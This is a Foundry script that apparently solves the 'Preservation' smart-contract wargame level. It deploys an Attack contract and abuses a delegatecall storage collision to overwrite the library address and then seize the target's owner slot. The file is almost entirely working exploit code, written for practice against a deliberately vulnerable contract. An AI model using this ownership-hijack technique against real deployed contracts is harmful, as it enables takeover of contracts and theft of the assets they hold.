// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Preservation} from "../src/Preservation.sol";
import {Script, console} from "forge-std/script.sol";

contract PreservationSolution is Script {
    Preservation preservation = Preservation(0x083bd8aB540b10018Ff39226DC2646A66DC96905);
    address myAdd = 0x73de6b8e575D8B31A89568e9B3d0b3E89C25d8e5;

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attack attack = new Attack();
        address attackAddress = address(attack);
        address timeZoneBeforeAttack = preservation.timeZone1Library();
        console.log("The actual owner is :", preservation.owner());
        console.log("Time zone before the attack:", timeZoneBeforeAttack);
        uint256 attackAddressEncoded = uint256(uint160(attackAddress));
        preservation.setFirstTime(attackAddressEncoded);
        address timezoneAfterAttack = preservation.timeZone1Library();
        console.log("The address attack is :", attackAddress);
        console.log("Time zone after the attack:", timezoneAfterAttack);
        preservation.setFirstTime(uint256(uint160(myAdd)));
        console.log("The owner at end of the attack :", preservation.owner());
        require(myAdd == preservation.owner(), "Your attack failed");
        vm.stopBroadcast();
    }
}

contract Attack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    Preservation preservation = Preservation(0x083bd8aB540b10018Ff39226DC2646A66DC96905);

    function setFirstTime(uint256 _timeStamp) public {
        preservation.setFirstTime(_timeStamp);
    }

    function setTime(uint256 _owner) public {
        owner = address(uint160(_owner));
    }
}

interface IPreservation {
    function owner() external view returns (address);
    function setFirstTime(uint256) external;
}

//0x73de6b8e575D8B31A89568e9B3d0b3E89C25d8e5
